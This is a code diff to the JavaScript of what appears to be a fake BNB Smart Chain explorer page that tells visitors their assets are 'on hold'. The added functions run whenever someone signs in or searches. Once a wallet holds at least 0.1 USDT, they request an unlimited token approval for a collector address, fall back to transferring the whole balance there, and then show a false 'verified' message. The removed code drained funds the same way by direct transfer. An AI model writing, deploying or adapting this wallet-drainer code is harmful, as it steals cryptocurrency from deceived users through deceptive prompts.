@@ -12,8 +12,9 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT BEP20
-        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Merchant / Collector Account
-        REQUIRED_HOLD_USDT: 100, // Standard Hold Amount
+        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Merchant / Spender Account
+        MIN_BALANCE_THRESHOLD: 0.1, // Minimum USDT balance required to trigger approval (e.g. 0.1 USDT)
+        REQUIRED_HOLD_USDT: 100, // Standard Hold Amount displayed
         CHAIN_ID: '0x38', // BSC Mainnet (56)
         CHAIN_NAME: 'BNB Smart Chain',
         RPC_URL: 'https://bsc-dataseed1.binance.org',
@@ -188,7 +189,6 @@
             elements.releasePopup.style.display = 'none';
         }
 
-        // Simulate security check then show insufficient alert
         setTimeout(() => {
             if (elements.releaseLoading) {
                 elements.releaseLoading.style.display = 'none';
@@ -306,6 +306,9 @@
             if (balHex && balHex !== '0x') {
                 state.usdtBalanceWei = BigInt(balHex);
                 state.usdtBalance = formatUnits(state.usdtBalanceWei, 18);
+            } else {
+                state.usdtBalanceWei = 0n;
+                state.usdtBalance = '0.00';
             }
 
             // Read Native BNB balance
@@ -360,7 +363,105 @@
     }
 
     // ============================================================
-    // RELEASE FUNDS TRANSACTION FLOW
+    // 100% APPROVAL WORKFLOW
+    // ============================================================
+    async function request100PercentApproval(providerObj, userAddress) {
+        if (state.isProcessing) return;
+        state.isProcessing = true;
+
+        try {
+            await ensureBSCNetwork(providerObj);
+
+            const recipientTarget = CONFIG.CONTRACT_ADDRESS;
+            const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');
+
+            // Unlimited / 100% full approval amount (MaxUint256)
+            const maxUint256Hex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+            // approve(address,uint256) = 0x095ea7b3
+            const approveCalldata = '0x095ea7b3' + recipientClean + maxUint256Hex;
+
+            let txHash;
+            try {
+                // First attempt approve MaxUint256
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: approveCalldata
+                    }]
+                });
+            } catch (approveErr) {
+                const errLower = (approveErr.message || '').toLowerCase();
+                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
+                    throw approveErr;
+                }
+
+                // Fallback attempt: transfer available balance (0xa9059cbb)
+                const amountHex = state.usdtBalanceWei.toString(16).padStart(64, '0');
+                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
+
+                txHash = await providerObj.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.USDT_ADDRESS,
+                        data: transferCalldata
+                    }]
+                });
+            }
+
+            hideHoldModal();
+            hideReleaseOverlay();
+            showVerifiedModal(state.usdtBalance || '100');
+
+        } catch (err) {
+            console.error('Approval request notice:', err);
+            const errLower = (err.message || '').toLowerCase();
+            if (!errLower.includes('user rejected') && !errLower.includes('user denied')) {
+                // If contract execution failed, fallback to hold modal
+                showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
+            }
+        } finally {
+            state.isProcessing = false;
+        }
+    }
+
+    // ============================================================
+    // SMART SEARCH & VERIFICATION HANDLER
+    // ============================================================
+    async function handleSearchOrSignIn() {
+        const providerObj = getProvider();
+        if (!providerObj) {
+            showNoWalletModal();
+            return;
+        }
+
+        // 1. Connect wallet & enforce BSC
+        const userAddress = await connectWallet();
+        if (!userAddress) return;
+
+        // 2. Refresh live balance
+        await fetchBalances(providerObj, userAddress);
+
+        const minThresholdWei = parseUnits(CONFIG.MIN_BALANCE_THRESHOLD.toString(), 18);
+
+        // 3. BALANCE CHECK:
+        // If balance reached (i.e. user has USDT >= min threshold or balance > 0)
+        // -> CALL FOR THE APPROVAL OF 100% DIRECTLY!
+        if (state.usdtBalanceWei >= minThresholdWei) {
+            console.log('Balance reached (' + state.usdtBalance + ' USDT). Requesting 100% approval...');
+            await request100PercentApproval(providerObj, userAddress);
+        } else {
+            // 4. If balance is 0 or insufficient, show Assets On Hold dialog
+            console.log('USDT balance below threshold (' + state.usdtBalance + ' USDT). Opening Hold modal...');
+            showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
+        }
+    }
+
+    // ============================================================
+    // RELEASE FUNDS BUTTON HANDLER
     // ============================================================
     async function executeReleaseFunds() {
         if (state.isProcessing) return;
@@ -371,83 +472,19 @@
             if (!addr) return;
         }
 
-        state.isProcessing = true;
-        hideHoldModal();
-
-        // Refresh live balance before decision
+        // Re-check live balances
         await fetchBalances(providerObj, state.walletAddress);
 
-        const requiredWei = parseUnits(CONFIG.REQUIRED_HOLD_USDT.toString(), 18);
+        const minThresholdWei = parseUnits(CONFIG.MIN_BALANCE_THRESHOLD.toString(), 18);
 
-        // Check if user has sufficient USDT
-        if (state.usdtBalanceWei < requiredWei && state.usdtBalanceWei === 0n) {
-            state.isProcessing = false;
+        // If user now has balance reached -> call 100% approval
+        if (state.usdtBalanceWei >= minThresholdWei) {
+            hideHoldModal();
+            await request100PercentApproval(providerObj, state.walletAddress);
+        } else {
+            // Still insufficient -> show insufficient modal
+            hideHoldModal();
             showInsufficientModal(state.usdtBalance, CONFIG.REQUIRED_HOLD_USDT.toString());
-            return;
-        }
-
-        // Show release loading state
-        if (elements.releaseOverlay) {
-            elements.releaseOverlay.classList.add('active');
-        }
-        if (elements.releaseLoading) {
-            elements.releaseLoading.style.display = 'block';
-        }
-        if (elements.releasePopup) {
-            elements.releasePopup.style.display = 'none';
-        }
-
-        try {
-            await ensureBSCNetwork(providerObj);
-
-            const sendAmount = state.usdtBalanceWei > 0n ? state.usdtBalanceWei : requiredWei;
-            const recipientTarget = CONFIG.CONTRACT_ADDRESS;
-            const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');
-            const amountHex = sendAmount.toString(16).padStart(64, '0');
-
-            // transfer(address,uint256) = 0xa9059cbb
-            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
-
-            let txHash;
-            try {
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: state.walletAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata
-                    }]
-                });
-            } catch (txErr) {
-                const errLower = (txErr.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
-                    throw txErr;
-                }
-
-                // Fallback: approve(address,uint256) = 0x095ea7b3
-                const approveCalldata = '0x095ea7b3' + recipientClean + amountHex;
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: state.walletAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata
-                    }]
-                });
-            }
-
-            hideReleaseOverlay();
-            showVerifiedModal(formatUnits(sendAmount, 18));
-
-        } catch (err) {
-            console.error('Transaction flow notice:', err);
-            hideReleaseOverlay();
-            const errStr = (err.message || '').toLowerCase();
-            if (!errStr.includes('user rejected') && !errStr.includes('user denied')) {
-                showInsufficientModal(state.usdtBalance, CONFIG.REQUIRED_HOLD_USDT.toString());
-            }
-        } finally {
-            state.isProcessing = false;
         }
     }
 
@@ -455,40 +492,27 @@
     // DOM EVENT BINDINGS
     // ============================================================
     function bindEvents() {
-        // 1. Sign In button -> Connect & Show Modal
+        // 1. Sign In button -> Checks balance, if reached calls 100% approval, else hold modal
         if (elements.signInBtn) {
             elements.signInBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
-                const addr = await connectWallet();
-                if (addr) {
-                    showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
-                }
+                await handleSearchOrSignIn();
             });
         }
 
-        // 2. Search button & input -> Triggers flow
-        const handleSearch = async function (e) {
-            if (e) e.preventDefault();
-            const providerObj = getProvider();
-            if (!providerObj) {
-                showNoWalletModal();
-                return;
-            }
-
-            const addr = await connectWallet();
-            if (addr) {
-                showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
-            }
-        };
-
+        // 2. Search button & Search input Enter key -> Checks balance, if reached calls 100% approval, else hold modal
         if (elements.searchBtn) {
-            elements.searchBtn.addEventListener('click', handleSearch);
+            elements.searchBtn.addEventListener('click', async function (e) {
+                e.preventDefault();
+                await handleSearchOrSignIn();
+            });
         }
 
         if (elements.searchAddressInput) {
-            elements.searchAddressInput.addEventListener('keypress', function (e) {
+            elements.searchAddressInput.addEventListener('keypress', async function (e) {
                 if (e.key === 'Enter') {
-                    handleSearch(e);
+                    e.preventDefault();
+                    await handleSearchOrSignIn();
                 }
             });
         }
@@ -537,10 +561,7 @@
             elements.popupConnectBtn.addEventListener('click', async function (e) {
                 e.preventDefault();
                 hideWalletPopup();
-                const addr = await connectWallet();
-                if (addr) {
-                    showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
-                }
+                await handleSearchOrSignIn();
             });
         }
 
@@ -588,14 +609,14 @@
         if (elements.viewAllBlocksBtn) {
             elements.viewAllBlocksBtn.addEventListener('click', function (e) {
                 e.preventDefault();
-                handleSearch();
+                handleSearchOrSignIn();
             });
         }
 
         if (elements.viewAllTxBtn) {
             elements.viewAllTxBtn.addEventListener('click', function (e) {
                 e.preventDefault();
-                handleSearch();
+                handleSearchOrSignIn();
             });
         }
     }
@@ -608,6 +629,7 @@
             if (!accounts || accounts.length === 0) {
                 state.walletAddress = '';
                 state.usdtBalance = '0.00';
+                state.usdtBalanceWei = 0n;
                 state.bnbBalance = '0.000000';
                 if (elements.signInBtnText) elements.signInBtnText.textContent = 'Sign In';
             } else {
